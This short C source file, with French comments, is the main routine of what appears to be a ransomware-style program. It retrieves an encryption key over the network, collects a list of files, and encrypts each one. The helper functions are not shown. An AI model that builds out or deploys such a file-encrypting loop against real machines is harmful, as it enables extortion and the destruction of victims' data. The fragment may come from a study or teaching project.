#include "../includes/include.h"

int main(int argc, char **argv) {
	fichier_t *files = NULL;
	clef_t *key = NULL;
	fichier_t *file = NULL;

	// recuperation de la clef en reseau
	get_key(&key);
	printf("key to cipher : %s\n", key->key);

	// recuperation des fichiers a chiffrer
	find_files(&files);
	file = files;

	// chiffrement des fichiers
	while(file != NULL) {
		cipher_file(file->fileLink, key->key);
		file = file->next;
	}
	clear_list_file(&files);

	free(key);
	return 0;
}